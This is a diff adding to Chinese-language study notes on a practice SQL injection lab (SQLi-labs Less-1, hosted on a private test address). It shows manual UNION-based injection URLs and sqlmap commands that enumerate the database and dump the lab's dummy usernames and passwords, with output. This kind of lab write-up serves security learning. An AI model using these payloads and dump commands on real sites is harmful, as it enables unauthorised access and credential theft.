@@ -11,6 +11,7 @@ url:http://10.0.2.15/sqli/Less-1/?id=1%27--%20
 故说明推测成立
 
 拆解：
+方法一：
 1.判断字段数
 url:http://10.0.2.15/sqli/Less-1/?id=1' order by 3 --+
 显示：用户名和密码，说明字段数至少为3
@@ -38,3 +39,69 @@ url:http://10.0.2.15/sqli/Less-1/?id=16' UNION SELECT 1,group_concat(column_name
 http://10.0.2.15/sqli/Less-1/?id=16' UNION SELECT 1,group_concat(username,0x3a,password),3 from users--+
 显示：
 Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
+方法二（使用sqlmap）：
+1.数据库名
+在终端输入sqlmap -u "http://10.0.2.15/sqli/Less-1/?id=1" --dbs --batch
+显示：
+available databases [5]:                                                  
+[*] challenges
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+推测使用security
+
+2.表名
+在终端输入sqlmap -u "http://10.0.2.15/sqli/Less-1/?id=1" -D security --tables --batch
+显示：
+Database: security                                                        
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+推测在users中
+
+3.字段名
+在终端输入sqlmap -u “http://10.0.2.15/sqli/Less-1/?id=1” -D security -T users --columns --batch
+显示：
+Database: security                                                        
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+推测username为用户名，password为密码
+
+4.字段值
+sqlmap -u “http://10.0.2.15/sqli/Less-1/?id=1” -D security -T users -C username,password --dump --batch
+显示：
+Database: security                                                        
+Table: users
+[13 entries]
++----------+------------+
+| username | password   |
++----------+------------+
+| Dumb     | Dumb       |
+| Angelina | I-kill-you |
+| Dummy    | p@ssword   |
+| secure   | crappy     |
+| stupid   | stupidity  |
+| superman | genious    |
+| batman   | mob!le     |
+| admin    | admin      |
+| admin1   | admin1     |
+| admin2   | admin2     |
+| admin3   | admin3     |
+| dhakkan  | dumbo      |
+| admin4   | admin4     |
++----------+------------+
+
+
